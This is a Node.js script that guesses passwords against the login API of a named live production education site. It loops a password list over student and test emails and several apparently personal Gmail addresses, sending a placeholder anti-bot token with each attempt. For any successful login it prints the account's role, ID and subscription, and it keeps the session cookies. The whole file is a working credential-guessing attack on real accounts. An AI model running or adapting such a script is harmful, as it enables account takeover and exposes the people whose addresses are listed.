const https = require('https');

const emails = [
  'student_a_part3@collegeo.in',
  'student_b_part3@collegeo.in',
  'student_c_part3@collegeo.in',
  'student_d_part3@collegeo.in',
  'studenta_part15@collegeo.in',
  'studenta_part13@collegeo.in',
  'studentb_part13@collegeo.in',
  'test_student_part11@collegeo.in',
  'test_student_part12@collegeo.in',
  'test_student_part10@collegeo.in',
  'free_part9@collegeos.test',
  'premium_part9@collegeos.test',
  'student_part1_onboard_1788710476845@collegeo.in',
  'shuklaabhayas0@gmail.com',
  'katiyarsumit7708@gmail.com',
  'krishnamdwivedi17@gmail.com'
];

const passwords = [
  'Password123!',
  'StudentPass#123',
  'Student@1234',
  'Student@123',
  'QaPass#123',
  'TestPass@123',
  'CollegeOS_Admin_2026@Secure',
  'CollegeOS@123',
  'AdminPassword123!',
  'Admin@123456',
  'admin1234',
  'Test@1234',
  'Test1234!'
];

async function tryLogin(email, password) {
  const body = JSON.stringify({
    email,
    password,
    turnstileToken: '1x00000000000000000000AA'
  });

  return new Promise((resolve) => {
    const req = https.request({
      hostname: 'collegeo.in',
      path: '/api/auth/login',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    }, (r) => {
      let d = '';
      r.on('data', c => d += c);
      r.on('end', () => {
        let j = null;
        try { j = JSON.parse(d); } catch(e) {}
        const cookies = (r.headers['set-cookie'] || []).map(c => c.split(';')[0]).join('; ');
        resolve({ email, password, status: r.statusCode, json: j, cookies });
      });
    });
    req.write(body);
    req.end();
  });
}

async function scan() {
  console.log('Scanning student credentials on live production...');
  for (const email of emails) {
    for (const pass of passwords) {
      const res = await tryLogin(email, pass);
      if (res.status === 200) {
        console.log(`\n========================================`);
        console.log(`FOUND VALID STUDENT LOGIN:`);
        console.log(`Email: ${email}`);
        console.log(`Role: ${res.json?.user?.role}`);
        console.log(`User ID: ${res.json?.user?.id}`);
        console.log(`Subscription: ${res.json?.user?.subscription_tier}`);
        console.log(`========================================\n`);
        return { email, pass, user: res.json?.user, cookies: res.cookies };
      }
    }
  }
  console.log('Scan completed, no matches among tested set.');
}

scan().catch(console.error);
